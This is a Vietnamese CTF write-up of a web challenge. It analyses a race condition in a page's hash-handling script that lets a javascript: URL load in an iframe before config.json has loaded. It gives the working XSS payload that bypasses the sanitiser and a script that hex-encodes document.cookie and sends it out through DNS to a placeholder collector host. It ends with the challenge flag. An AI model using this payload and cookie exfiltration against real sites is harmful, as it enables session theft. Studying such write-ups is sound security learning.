## Description:

I will teach you how to play CTF :) 

Note: The local server is running on port 2808

/bot.html

### Point: 967

### Solve: 5

------------

## Phân tích:

Trước tiên, ae hãy xem qua file script.js và config.json

- File script.js

```js
/* ============================================================
   Load config
   ============================================================ */

var config;
fetch("config.json")
.then(resp => resp.json())
.then(async resp => {
    config = resp
    document.body.style.backgroundColor = config.background;
    document.body.style.color = config.text_color;
    await loadContentsList(config);

    if (location.hash.length > 0) config.skin = 'Pane', initPane(config);
    else {
        const url = new URL(location.href);
        if (url.searchParams.get("doc")) config.skin = 'Modern', initModern(config);
        else config.skin = 'Default', initDefault(config);
    }
})

if (location.hash.length > 0) {
    sanitizeHash();
    window.onhashchange = () => loadPaneContent(config);
}
/* ============================================================
   Build navigation list
   ============================================================ */
async function loadContentsList(config) {
    const nav = document.getElementById("nav");
    nav.innerHTML = "";

    config.contents.forEach(file => {
        const name = file.replace(".html", "");
        nav.innerHTML += `
            <li><a href="#" class="nav-item" data-file="${file}">${name}</a></li>
        `;
    });

    attachNavHandlers(config);
}

/* ============================================================
   Navigation Handlers
   ============================================================ */
function attachNavHandlers(config) {
    document.querySelectorAll(".nav-item").forEach(item => {
        item.addEventListener("click", (e) => {
            e.preventDefault();
            const file = item.getAttribute("data-file");

            if (config.skin === "Pane") {
                location.hash = file;  // Pane uses hash
            } else if (config.skin === "Default") {
                loadDefault(file);
            } else if (config.skin === "Modern") {
                const url = new URL(location.href);
                url.searchParams.set("doc", file);
                location.href = url.toString();
            }
        });
    });
}

/* ============================================================
   Pane Theme — 3 Panel View
   ============================================================ */
function initPane(config) {
    hideAllViewers();
    document.body.classList.add("pane");

    document.getElementById("viewerLeft").style.display = "block";
    document.getElementById("viewerCenter").style.display = "block";
    document.getElementById("viewerRight").style.display = "block";

    loadPaneContent(config);
}

function sanitizeHash() {
    currentHash = location.hash.substring(1)
    if (currentHash)
    {
        var decodedHash = decodeURIComponent(currentHash);
        var sanitizedHash = decodedHash.replace(/(javascript:|data:|[<>])/gi, '');
        if (decodedHash != sanitizedHash) {
            document.location.hash = encodeURI(sanitizedHash);
        }
    }
}

function loadPaneContent(config) {
    sanitizeHash()
    let file = location.hash.substring(1) || config.default;
    if (file) {

        document.getElementById("viewerLeft").innerHTML =
            `<h2>Overview</h2><p>You selected: ${encodeURIComponent(file)}</p>`;
        url = new URL(location.href)
        if (config) {
            if (!config.load_remote) {
                file = "contents/" + file;
            }
            else {
                if (!file.startsWith("http://") && !file.startsWith("https://"))
                    file = url.origin + url.pathname + "/contents" + file;
            }
        }
        document.getElementById("viewerCenter").contentWindow.location.replace(decodeURI(file));
        document.getElementById("viewerRight").innerHTML =
            `<h2>Extras</h2><p>Copyright.</p>`;
    }
}

/* ============================================================
   Default Theme
   ============================================================ */
function initDefault(config) {
    hideAllViewers();
    document.body.classList.add("default");

    document.getElementById("viewer").style.display = "block";
    loadDefault(config.default);
}

async function loadDefault(file) {
    const text = await fetch("contents/" + file).then(r => r.text());
    document.getElementById("viewer").innerHTML = text;
}

/* ============================================================
   Modern Theme
   ============================================================ */
function initModern(config) {
    hideAllViewers();
    document.body.classList.add("modern");

    document.getElementById("viewer").style.display = "block";

    const params = new URLSearchParams(location.search);
    const doc = params.get("doc") || config.default;

    loadModern(doc);
}

async function loadModern(file) {
    const text = await fetch("contents/" + file).then(r => r.text());
    document.getElementById("viewer").innerHTML =
        `<div class="modern-card">${text}</div>`;
}

/* ============================================================
   Helpers
   ============================================================ */
function hideAllViewers() {
    document.querySelectorAll("#viewer, .pane-panel").forEach(el => {
        el.style.display = "none";
    });
}
```

- File config.json:

```json
{
  "background": "red",
  "text_color": "red",

  "load_remote": false,

  "default": "content1.html",

  "contents": [
    "content1.html",
    "content2.html",
    "content3.html",
    "content4.html",
    "content5.html"
  ]
}
```

Như ae đã thấy, file `config.json` sẽ định nghĩa backgroud, màu chữ, về việc có được load ở remote hay không, default content với list content.

Trong khi đó, file `script.js` thì có 3 chế độ hiển thị: Default mode, Modern mode và Pane mode.

Ở `Default mode`, web sẽ hiển thị nội dung của đường dẫn `/contents/content1.html` trong innerHtml

Ở `Modern mode`, web sẽ lấy param doc, tức phần đằng sau `?doc=` gắn cho biến file, sau đó fetch đến contents + `file` và hiển thị nội dung trong innerHtml

Ở `Pane mode`, web sẽ lấy phần đằng sau `#`, đó là `hash`. Nếu độ dài của hash lớn hơn 0, nó sẽ gọi `sanitizeHash()` và tạo event hander khi hash thay đổi (onhashchange)

```js
if (location.hash.length > 0) {
    sanitizeHash();
    window.onhashchange = () => loadPaneContent(config);
}
```

Trước tiên, hãy xem kĩ hàm `sanitizeHash` trước:

```js
function sanitizeHash() {
    currentHash = location.hash.substring(1)
    if (currentHash)
    {
        var decodedHash = decodeURIComponent(currentHash);
        var sanitizedHash = decodedHash.replace(/(javascript:|data:|[<>])/gi, '');
        if (decodedHash != sanitizedHash) {
            document.location.hash = encodeURI(sanitizedHash);
        }
    }
}
```

Nó sẽ bỏ đi javascript, data, <, >. Tức là, nếu bỏ đi, thì độ dài thay đổi, sự kiện onhashchange chạy hàm loadPaneContent(config)

```js
function loadPaneContent(config) {
    sanitizeHash()
    let file = location.hash.substring(1) || config.default;
    if (file) {

        document.getElementById("viewerLeft").innerHTML =
            `<h2>Overview</h2><p>You selected: ${encodeURIComponent(file)}</p>`;
        url = new URL(location.href)
        if (config) {
            if (!config.load_remote) {
                file = "contents/" + file;
            }
            else {
                if (!file.startsWith("http://") && !file.startsWith("https://"))
                    file = url.origin + url.pathname + "/contents" + file;
            }
        }
        document.getElementById("viewerCenter").contentWindow.location.replace(decodeURI(file));
        document.getElementById("viewerRight").innerHTML =
            `<h2>Extras</h2><p>Copyright.</p>`;
    }
}
```

Nếu hàm này không nhận được config, nó sẽ bỏ qua toàn bộ cơ chế xác thực và làm iframe điều hướng sang trang mới mà ko thay đổi src, ví dụ

<img src="image/iframe.png" width="1000px" height="auto">


Bạn có để ý `#document` ở phía dưới chứ. Do đây, tôi đã load `config` rồi, kết hợp với `load_remote = false` thì kết quả bên trên. Nếu không có `config`, nó sẽ thay đổi trực tiếp phần `#document` đó thành `javascript:alert(1)` và ta có xss.

Tiếp theo, hãy để ý đến đoạn đầu của script.js:

```js
var config;
fetch("config.json")
.then(resp => resp.json())
.then(async resp => {
    config = resp
    document.body.style.backgroundColor = config.background;
    document.body.style.color = config.text_color;
    await loadContentsList(config);

    if (location.hash.length > 0) config.skin = 'Pane', initPane(config);
    else {
        const url = new URL(location.href);
        if (url.searchParams.get("doc")) config.skin = 'Modern', initModern(config);
        else config.skin = 'Default', initDefault(config);
    }
})

if (location.hash.length > 0) {
    sanitizeHash();
    window.onhashchange = () => loadPaneContent(config);
}
```

Nó fetch config.json xong bắt đầu gọi các hàm init, cũng như thiết lập event handle. Fetch thì tốn rất nhiều thời gian trong khi trong lúc web đang fetch thì đoạn event handle cũng chạy luôn rồi. Do đó ta có thể làm sao đó để giá trị hash > 0, rồi khiến độ dài của hash thay đổi 1 lần nữa. Từ đó, ta gọi thằng loadPaneContent ra

## Kết luận:
- Ta có thể xss nếu gọi được loadPaneContent mà không có config bằng cách sử dụng `javacript:alert(1)`
- Nếu ta tạo 1 request có sẵn hash ban đầu, thì sanitizeHash và event handle onhashchange được gọi trước cả khi config được load xong => Ta sẽ có 1 khoảng thời gian mà config không tồn tại
- SanitizeHash sẽ loại bỏ các phần không hợp lệ, từ đó thay đổi độ dài hash
- Khi thay đổi độ dài hash, onhashchange được bắt, và loadPaneContent

=> Đây là race condition xss


## Khai thác:
 
Dựa vào các kết luận trên, cách exploit của ta sẽ là tạo request `GET /#java%0ascript:alert(1)` để khiến sanitizeHash ko ăn mất phần javascript. Tuy nhiên như thế thì không trigger được event onhashchange. Do đó, ta sẽ thêm dấu `<` vào để sanitizeHash ăn mất kí tự này. Từ đó độ dài hash thay đổi, và ta trigger được event `onhashchange`, và gọi ra `loadPaneContent` với config không tồn tại.

Vậy, request để alert là

```
GET /#java%0a<script:alert(1)
```

Và kết quả là

<img src="image/alert.png" width="1000px" height="auto">

Do bot không có trả http response về nên ta sẽ xài dns thay thế. Final script (gửi cho bot nhé hehe)

Đầu tiên chỉnh sửa đoạn js này

```js
var t=document.cookie;var h="";for(var i=0;i<t.length;i++){h+=t.charCodeAt(i).toString(16);if(i%30==29)h+=".";}new Image().src="http://"+h+".<your_request_repo>"
```

Encode payload sang base64 rồi gửi đoạn sau cho bot

```
http://localhost:2808/#java%0A<script:eval(atob("<your_base64_payload>"))
```

Kết quả trả về

<img src="image/dns.png" width="1000px" height="auto">

Dịch đoạn hex thì ta có

## Flag:
`W1{h@vE-Y0u-eVer_Se3n-tH1S-k1Nd_oF-R4CE-cOnDlT1on_????b}`